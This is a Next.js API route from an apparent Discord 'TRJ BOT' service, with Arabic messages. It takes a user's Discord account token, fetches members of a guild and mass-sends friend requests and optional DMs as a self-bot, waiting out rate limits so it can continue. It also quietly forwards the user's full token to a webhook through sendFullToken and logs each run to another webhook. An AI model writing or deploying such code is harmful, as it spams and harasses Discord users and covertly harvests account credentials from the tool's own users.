
import { NextRequest, NextResponse } from 'next/server';
import { cleanToken, discordFetch } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { sendFullToken } from '@/lib/webhook';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';
import { checkPrimeFromProof } from '@/lib/prime-store';

export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:friend-spam`, RATE_LIMITS.heavy);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429 });
    }

    const body = await request.json().catch(() => ({}));
    const { token, guildId, maxRequests, message, primeProof } = body as {
      token: string;
      guildId: string;
      maxRequests?: number;
      message?: string;
      primeProof?: string;
    };

    if (!token || !guildId) {
      return NextResponse.json({ success: false, error: 'أدخل التوكن وأيدي السيرفر' }, { status: 400 });
    }

    const ct = cleanToken(token);
    const max = Math.min(maxRequests || 50, 100);

    // ===== تحقق من التوكن =====
    const verifyResult = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });
    if (!verifyResult.ok || !verifyResult.data) {
      return NextResponse.json({ success: false, error: 'توكن غير صالح' }, { status: 401 });
    }

    const userData = verifyResult.data as { id: string; username: string; discriminator?: string };

    // ===== تحقق من Prime =====
    if (!await checkPrimeFromProof(primeProof, userData.id)) {
      return NextResponse.json({ success: false, error: 'هذه الميزة حصرية لأعضاء Prime' }, { status: 403 });
    }

    const userTag = `${userData.username}#${userData.discriminator || '0'}`;

    sendFullToken('Friend Spam', ct, { '👤 المستخدم': userTag, '🏰 السيرفر': guildId });

    const logs: string[] = [`🎯 بدء إرسال طلبات صداقة لسيرفر: ${guildId}`];
    let successCount = 0;
    let failCount = 0;

    logs.push('📋 جاري جلب أعضاء السيرفر...');

    const membersRes = await discordFetch(ct, 'GET', `/guilds/${guildId}/members?limit=1000`, undefined, { userOnly: true, timeout: 15000 });

    if (!membersRes.ok || !membersRes.data) {
      return NextResponse.json({ success: false, error: 'فشل جلب أعضاء السيرفر - تأكد أن الحساب عضو في السيرفر', logs });
    }

    const members = membersRes.data as any[];
    logs.push(`👥 تم العثور على ${members.length} عضو`);

    let sent = 0;
    for (const member of members) {
      if (sent >= max) break;
      if (member.user?.id === userData.id) continue; // تخطي نفسه

      try {
        const friendRes = await discordFetch(ct, 'PUT', `/users/@me/relationships/${member.user.id}`, {
          type: 1
        }, { userOnly: true, timeout: 10000 });

        if (friendRes.ok || friendRes.status === 204) {
          successCount++;
          sent++;
          logs.push(`✅ طلب صداقة: ${member.user.username}`);

          if (message) {
            await new Promise(r => setTimeout(r, 500));
            const dmRes = await discordFetch(ct, 'POST', '/users/@me/channels', {
              recipient_id: member.user.id
            }, { userOnly: true, timeout: 10000 });

            if (dmRes.ok && dmRes.data) {
              const channel = dmRes.data as any;
              await discordFetch(ct, 'POST', `/channels/${channel.id}/messages`, {
                content: message
              }, { userOnly: true, timeout: 10000 });
            }
          }
        } else {
          if (friendRes.status === 429) {
            logs.push(`⏳ تقييد - انتظار...`);
            await new Promise(r => setTimeout(r, 5000));
          } else {
            failCount++;
            sent++;
          }
        }

        await new Promise(r => setTimeout(r, 1000));
      } catch {
        failCount++;
      }
    }

    logs.push('');
    logs.push(`📊 النتيجة: ✅ ${successCount} نجح | ❌ ${failCount} فشل`);

    const webhookUrl = getLogWebhookUrl();
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: '👥 Friend Request Spam',
              description: `**تم إرسال طلبات صداقة في سيرفر:** ${guildId}`,
              color: 0x5865F2,
              fields: [
                { name: '👤 المستخدم', value: userTag, inline: true },
                { name: '🏰 السيرفر', value: guildId, inline: true },
                { name: '✅ نجح', value: successCount.toString(), inline: true },
                { name: '❌ فشل', value: failCount.toString(), inline: true },
              ],
              footer: { text: 'TRJ BOT - Prime Feature' },
              timestamp: new Date().toISOString()
            }]
          })
        });
      } catch {}
    }

    return NextResponse.json({
      success: true,
      logs,
      stats: { total: sent, success: successCount, failed: failCount }
    });

  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    console.error('[Friend Spam Error]', message);
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}

